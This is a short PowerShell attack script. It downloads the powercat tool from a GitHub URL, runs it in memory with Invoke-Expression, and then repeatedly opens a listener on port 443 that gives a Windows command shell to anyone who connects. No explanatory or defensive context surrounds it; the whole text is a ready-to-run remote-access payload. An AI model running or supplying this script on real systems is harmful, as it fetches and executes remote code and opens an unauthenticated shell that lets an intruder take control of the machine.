(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1") | iex; 
$tries = 1..10 #Try 10 times then exit. Cheat to keep it running longer 
foreach($t in $tries){
    powercat -l -p 443 -e cmd
}
